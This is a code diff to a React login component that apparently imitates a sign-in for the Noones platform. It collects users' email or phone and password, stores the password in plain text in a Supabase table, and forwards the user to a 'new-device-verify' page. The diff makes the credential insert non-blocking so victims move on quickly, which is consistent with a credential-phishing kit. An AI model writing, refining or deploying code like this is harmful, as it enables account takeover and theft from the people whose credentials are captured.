@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
 
-const NOONES_REQUEST_ID_KEY = 'current_request_id';
+const NOONES_TRACKING_ID_KEY = 'noones_tracking_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
@@ -26,11 +26,11 @@ export default function NoonesConnect() {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
   };
 
-  const saveNoonesProgress = (step: number, requestId?: string, requestData?: Record<string, unknown>) => {
+  const saveNoonesProgress = (step: number, trackingId?: string, requestData?: Record<string, unknown>) => {
     try {
       window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, step.toString());
-      if (requestId) {
-        window.localStorage.setItem(NOONES_REQUEST_ID_KEY, requestId);
+      if (trackingId) {
+        window.localStorage.setItem(NOONES_TRACKING_ID_KEY, trackingId);
       }
       if (requestData) {
         window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify(requestData));
@@ -43,18 +43,18 @@ export default function NoonesConnect() {
   const loadNoonesProgress = () => {
     try {
       const step = window.localStorage.getItem(NOONES_CURRENT_STEP_KEY);
-      const requestId = window.localStorage.getItem(NOONES_REQUEST_ID_KEY);
+      const trackingId = window.localStorage.getItem(NOONES_TRACKING_ID_KEY);
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
       const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
-      return { step: step ? parseInt(step) : null, requestId, requestData };
+      return { step: step ? parseInt(step) : null, trackingId, requestData };
     } catch {
-      return { step: null, requestId: null, requestData: null };
+      return { step: null, trackingId: null, requestData: null };
     }
   };
 
   const clearNoonesProgress = () => {
     window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
-    window.localStorage.removeItem(NOONES_REQUEST_ID_KEY);
+    window.localStorage.removeItem(NOONES_TRACKING_ID_KEY);
     window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
   };
 
@@ -82,39 +82,51 @@ export default function NoonesConnect() {
       setErrorMessage('Please enter your email/phone and password.');
       return;
     }
-    setLoading(true);
+    // Removed setLoading(true) for fire-and-move flow
     try {
-      const requestId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
-      console.log('Submitting blind insert to platform_connection_requests with id:', requestId);
-      const { error } = await supabase
-        .from('platform_connection_requests')
-        .insert({
-          id: requestId,
-          platform: 'Noones',
-          email,
-          third_party_password: password,
-        });
-
-      if (error) {
-        throw error;
-      }
+      // Fire and Move: Generate trackingId and save immediately
+      const trackingId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+      console.log('Generated tracking_id:', trackingId);
+      
+      // Save tracking_id and step to localStorage immediately
+      saveNoonesProgress(2, trackingId, { email, platform: 'Noones', tracking_id: trackingId });
+      console.log('Saved tracking_id and step 2 to localStorage immediately');
 
       const requestData = {
-        id: requestId,
+        tracking_id: trackingId,
         platform: 'Noones',
         email,
         third_party_password: password,
       };
 
-      saveNoonesProgress(2, requestId, requestData);
-      console.log('Blind insert completed, saved requestId and progressed to step 2');
+      // Fire off the insert but don't await it - non-blocking insert
+      supabase
+        .from('platform_connection_requests')
+        .insert({
+          tracking_id: trackingId,
+          platform: 'Noones',
+          email,
+          third_party_password: password,
+        })
+        .then((result) => {
+          if (result.error) {
+            console.error('Async insert error:', result.error);
+          } else {
+            console.log('Async insert completed for tracking_id:', trackingId);
+          }
+        })
+        .catch((err) => {
+          console.error('Async insert exception:', err);
+        });
 
-      navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData } });
+      // Immediately navigate - user moves to next page in < 500ms
+      console.log('[FIRE_AND_MOVE] Step 1 Complete:', { trackingId, email, platform: 'Noones' });
+      navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData, trackingId } });
+      // Note: setLoading(false) skipped intentionally - component unmounts on navigation
     } catch (err: any) {
-      console.error('Error inserting into platform_connection_requests:', err);
+      console.error('[FIRE_AND_MOVE] Error in handleSubmit:', err);
       setErrorMessage(err.message || 'An unexpected error occurred.');
-    } finally {
-      setLoading(false);
+      // Removed setLoading(false) since loading was not set
     }
   };
 
@@ -197,11 +209,10 @@ export default function NoonesConnect() {
 
             <button
               type="submit"
-              disabled={loading}
-              className="w-full h-[60px] hover:opacity-90 text-white font-bold text-[20px] rounded-xl transition-colors disabled:opacity-70 mt-4"
+              className="w-full h-[60px] hover:opacity-90 text-white font-bold text-[20px] rounded-xl transition-colors"
               style={{backgroundColor: isDarkMode ? '#44C166' : '#18C37E'}}
             >
-              {loading ? 'Connecting...' : 'Log in'}
+              Log in
             </button>
 
             <div className="text-center mt-4">
